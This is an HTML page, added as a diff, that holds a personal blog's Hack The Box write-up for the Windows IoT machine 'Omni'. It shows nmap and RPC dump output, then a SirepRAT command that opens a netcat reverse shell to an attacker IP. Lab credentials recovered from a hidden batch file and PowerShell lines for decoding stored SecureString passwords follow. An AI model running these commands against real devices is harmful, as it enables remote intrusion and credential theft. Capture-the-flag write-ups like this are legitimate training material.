@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Omni :: Research blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Omni Nmap 7.80 scan initiated Mon Aug 24 10:23:59 2020 as: nmap -Pn -sS -sV -p- -A -oN nmap.txt 10.10.10.204 Nmap scan report for 10.10.10.204 Host is up (0.091s latency). Not shown: 65529 filtered ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 5985/tcp open upnp Microsoft IIS httpd 8080/tcp open upnp Microsoft IIS httpd | http-auth: | HTTP/1.1 401 Unauthorized\x0D |_ Basic realm=Windows Device Portal |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn&amp;#39;t have a title." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://thomas-byrne.co.uk/hackthebox/omni/" />
+
+
+
+
+<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">
+
+  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Omni :: Research blog">
+<meta property="og:description" content="Hack The Box machine" />
+<meta property="og:url" content="https://thomas-byrne.co.uk/hackthebox/omni/" />
+<meta property="og:site_name" content="Omni" />
+
+  <meta property="og:image" content="https://thomas-byrne.co.uk/.">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-09 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    /home
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/hackthebox">HackTheBox</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/oscp">OSCP</a></li>
+              
+            
+              
+                <li><a href="/projects">Projects</a></li>
+              
+            
+              
+                <li><a href="/research">Research</a></li>
+              
+            
+              
+                <li><a href="/showcase">Showcase</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/hackthebox">HackTheBox</a></li>
+      
+    
+      
+        <li><a href="/oscp">OSCP</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+      
+        <li><a href="/research">Research</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://thomas-byrne.co.uk/hackthebox/omni/">Omni</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-09 
+      </span>
+    
+    
+    <span class="post-author">:: Tom</span>
+    
+  </div>
+
+  
+
+  
+    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="Omni" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="omni">Omni<a href="#omni" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Nmap 7.80 scan initiated Mon Aug <span style="color:#ae81ff">24</span> 10:23:59 <span style="color:#ae81ff">2020</span> as: nmap -Pn -sS -sV -p- -A -oN nmap.txt 10.10.10.204
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.204
+Host is up <span style="color:#f92672">(</span>0.091s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65529</span> filtered ports
+PORT      STATE SERVICE  VERSION
+135/tcp   open  msrpc    Microsoft Windows RPC
+5985/tcp  open  upnp     Microsoft IIS httpd
+8080/tcp  open  upnp     Microsoft IIS httpd
+| http-auth: 
+| HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized<span style="color:#ae81ff">\x</span>0D
+|_  Basic realm<span style="color:#f92672">=</span>Windows Device Portal
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title.
+29817/tcp open  unknown
+29819/tcp open  arcserve ARCserve Discovery
+29820/tcp open  unknown
+</code></pre></div><h2 id="information">Information<a href="#information" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>Windows IOT Device portal on port 8080</li>
+<li>dealing with some sort of rasberry pi type ctf</li>
+<li>once on portal could upload malicious payload</li>
+</ul>
+<h2 id="potential-attack-vectors">Potential attack vectors<a href="#potential-attack-vectors" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ol>
+<li>port 8080</li>
+</ol>
+<ul>
+<li>Running a webserver, asks for creds when visited</li>
+<li>could try windows device portal default creds</li>
+<li>could try auth bypass</li>
+<li>brute force</li>
+</ul>
+<ol start="2">
+<li>port 135</li>
+</ol>
+<ul>
+<li>RPC</li>
+<li>impacket? RPCdump?</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Impacket v0.9.22.dev1+20200624.115240.5db5e4fa - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving endpoint list from 10.10.10.204
+Protocol: N/A 
+Provider: N/A 
+UUID    : DD59071B-3215-4C59-8481-972EDADC0F6A v1.0 
+Bindings: 
+          ncalrpc:<span style="color:#f92672">[</span>umpo<span style="color:#f92672">]</span>
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : 3A9EF155-691D-4449-8D05-09AD57031823 v1.0 
+Bindings: 
+          ncalrpc:<span style="color:#f92672">[</span>LRPC-969e8bd0adcc18d488<span style="color:#f92672">]</span>
+          ncalrpc:<span style="color:#f92672">[</span>ubpmtaskhostchannel<span style="color:#f92672">]</span>
+          ncalrpc:<span style="color:#f92672">[</span>DeviceSetupManager<span style="color:#f92672">]</span>
+          ncalrpc:<span style="color:#f92672">[</span>IUserProfile2<span style="color:#f92672">]</span>
+          ncalrpc:<span style="color:#f92672">[</span>OLE6FC7DF673575CA3599FFF1D796AB<span style="color:#f92672">]</span>
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : D22895EF-AFF4-42C5-A5B2-B14466D34AB4 v1.0 
+Bindings: 
+          ncalrpc:<span style="color:#f92672">[</span>LRPC-76118920d558631e9e<span style="color:#f92672">]</span>
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : 0361AE94-0316-4C6C-8AD8-C594375800E2 v1.0 
+Bindings: 
+          ncalrpc:<span style="color:#f92672">[</span>umpo<span style="color:#f92672">]</span>
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : 6982A06E-5FE2-46B1-B39C-A2C545BFA069 v1.0 
+Bindings: 
+          ncalrpc:<span style="color:#f92672">[</span>umpo<span style="color:#f92672">]</span>
+
+Protocol: N/A 
+Provider: N/A 
+UUID    : 51A227AE-825B-41F2-B4A9-1AC9557A1018 v1.0 Ngc Pop Key Service
+Bindings: 
+          ncalrpc:<span style="color:#f92672">[</span>samss lpc<span style="color:#f92672">]</span>
+          ncalrpc:<span style="color:#f92672">[</span>SidKey Local End Point<span style="color:#f92672">]</span>
+          ncalrpc:<span style="color:#f92672">[</span>protected_storage<span style="color:#f92672">]</span>
+          ncalrpc:<span style="color:#f92672">[</span>lsasspirpc<span style="color:#f92672">]</span>
+          ncalrpc:<span style="color:#f92672">[</span>lsapolicylookup<span style="color:#f92672">]</span>
+          ncalrpc:<span style="color:#f92672">[</span>LSA_EAS_ENDPOINT<span style="color:#f92672">]</span>
+          ncalrpc:<span style="color:#f92672">[</span>LSA_IDPEXT_ENDPOINT<span style="color:#f92672">]</span>
+</code></pre></div><ol start="3">
+<li>IOT Device</li>
+</ol>
+<ul>
+<li>SirepRAT.py</li>
+<li><a href="https://github.com/SafeBreach-Labs/SirepRAT">https://github.com/SafeBreach-Labs/SirepRAT</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd <span style="color:#e6db74">&#34;cmd.exe&#34;</span> --args <span style="color:#e6db74">&#34;/c C:\nc.exe -e cmd.exe 10.10.14.162 5555 &#34;</span> --v
+
+</code></pre></div><blockquote>
+<p>hidden r.bat file in <code>C:\windows\system32&gt;cd C:\Program Files\WindowsPowerShell\Modules\PackageManagement</code></p>
+<blockquote>
+<p>contains username and password for device manager</p>
+</blockquote>
+</blockquote>
+<ul>
+<li>
+<p>net user app mesh5143
+net user administrator _1nt3rn37ofTh1nGz</p>
+</li>
+<li>
+<p>Able to enter commands on dashboard</p>
+</li>
+</ul>
+<p><a href="https://sodocumentation.net/powershell/topic/2917/handling-secrets-and-credentials">https://sodocumentation.net/powershell/topic/2917/handling-secrets-and-credentials</a></p>
+<h2 id="decode-securestring">Decode Securestring<a href="#decode-securestring" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$credential <span style="color:#f92672">=</span> Import-CliXml -Path C:<span style="color:#ae81ff">\&lt;</span>path to file&gt;
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$plainPass <span style="color:#f92672">=</span> $credential.GetNetworkCredential<span style="color:#f92672">()</span>.Password
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$plainPass
+</code></pre></div>
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
+<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
